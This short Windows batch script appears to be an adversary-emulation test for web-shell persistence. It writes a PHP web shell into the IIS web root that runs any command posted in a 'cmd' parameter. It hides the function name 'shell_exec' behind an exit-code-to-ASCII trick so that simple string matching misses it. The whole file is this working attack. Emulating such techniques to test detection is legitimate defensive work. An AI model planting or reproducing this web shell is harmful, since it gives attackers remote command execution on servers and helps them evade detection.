@echo off
set decimal=120
cmd /c exit /b %decimal%
mkdir C:\inetpub\wwwroot\
echo "$cmd = shell_e%=ExitCodeAscii%ec($_POST['cmd']);" >> C:\inetpub\wwwroot\T1505003001.php